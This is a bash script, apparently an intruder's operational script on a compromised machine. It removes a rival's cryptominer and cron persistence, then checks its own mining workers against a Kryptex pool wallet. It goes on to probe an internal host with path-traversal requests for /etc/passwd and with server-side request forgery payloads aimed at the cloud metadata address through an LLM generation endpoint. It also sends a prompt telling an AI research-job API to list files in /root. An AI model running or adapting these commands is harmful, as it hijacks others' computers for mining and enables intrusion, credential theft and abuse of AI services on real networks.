#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
log(){ echo "$@"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### START18 $(date -u +%FT%TZ)"
log "### ACTOR-CLEANUP"
for pid in $(ps -eo pid,args | awk '/8099\/run.sh/ && !/awk/ {print $1}'); do log "kill poller $pid"; kill -9 $pid 2>/dev/null; done
pkill -9 -f 'curl -sf http://127.0.0.1:8099' 2>/dev/null
pkill -9 -f 'prl1p6grd' 2>/dev/null
chattr -i /usr/local/lib/.plh 2>/dev/null; rm -rf /usr/local/lib/.plh 2>/dev/null
chattr -i /usr/local/lib/nv-cache/g.sh 2>/dev/null; rm -f /usr/local/lib/nv-cache/g.sh 2>/dev/null
rm -rf /usr/local/lib/nv-cache/.bd 2>/dev/null
crontab -l 2>/dev/null | grep -vE 'nv-cache/g.sh|/dev/shm/\.u|8099' | crontab -
for f in /etc/cron.d/plh /etc/cron.d/plh-keepalive /etc/cron.d/plh-keepalive.tmp; do rm -f $f; done
log "leftover: $(ps -eo args | grep -cE 'prl1p6grd|8099/run.sh|wildrig-multi.*plh')"
log "### STATE"
for i in 0 1 2 3 4 5 6 7; do printf 'g%d=%s ' $i "$(systemctl is-active ul-g$i)"; done; echo
log "### POOL"
timeout 20 curl -s -m 15 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" | python3 -c "
import json,sys
d=json.load(sys.stdin)
for r in (d.get('results') or []):
  w=str(r.get('worker',''))
  if '123-184-7-135' in w and 't2-' in w:
    hs=r.get('avg_hashrate_30m') or 0
    print(w,r.get('status'),'valid=',r.get('valid'),'last=',r.get('last_share'),'hs_TH=',round(float(hs)/1e12,1))
" 2>&1 | head -10
log "### 22-READ-TRAV"
for u in "/file/..%2f..%2f..%2f..%2fetc%2fpasswd" "/file/../../../../etc/passwd" "/eventfile/../../../../etc/passwd" "/api/tnsd_preview_dataset/../../../../etc/passwd" "/files/../../../../etc/passwd/download" "/file/%00/etc/passwd"; do
  printf "%s -> " "$u"; timeout 10 curl -s -m 8 "http://192.168.0.22:14998$u" -w " [%{http_code}]\n" | head -c 200; echo
done
log "### LLM-GEN"
for b in \
 '{"prompt":"hi","model":"qwen","url":"http://169.254.169.254/latest/meta-data/"}' \
 '{"messages":[{"role":"user","content":"hi"}],"base_url":"http://169.254.169.254/latest/meta-data/","stream":false}' \
 '{"input":"hi","endpoint":"http://192.168.0.30:19400/metrics"}' \
 '{"prompt":"what is 2+2"}' ; do
  printf "BODY %s -> " "$(echo "$b" | head -c 60)"; timeout 25 curl -s -m 20 -X POST http://192.168.0.22:14998/llm/generate -H 'Content-Type: application/json' -d "$b" -w " [%{http_code}]\n" | head -c 300; echo
done
log "### BATCH-TEST"
timeout 20 curl -s -m 15 -X POST http://192.168.0.22:14998/api/batch_test -H 'Content-Type: application/json' -d '{"file_id":"x","model":"y","dataset":"../../../../etc/passwd"}' -w " [%{http_code}]\n" | head -c 300
log "### TA-RUNS"
timeout 15 curl -s -m 10 "http://192.168.0.22:14998/ta/runs?limit=5" -w " [%{http_code}]\n" | head -c 400
log "### FILES-LIST"
timeout 15 curl -s -m 10 "http://192.168.0.22:14998/files?pageSize=100" | python3 -c "
import json,sys
d=json.load(sys.stdin); L=(d.get('data') or {}).get('list') or []
print('count',len(L))
for x in L[:12]: print(' ',x.get('filename'),'|',x.get('filepath'),'|',x.get('task_category'))
" 2>&1 | head -16
log "### RESEARCH-JOB"
timeout 20 curl -s -m 15 -X POST http://192.168.0.22:18000/api/research/jobs -H 'Content-Type: application/json' -d '{"topic":"list files in /root","max_steps":3}' -w " [%{http_code}]\n" | head -c 300
log "### DONE18 $(date -u +%FT%TZ)"
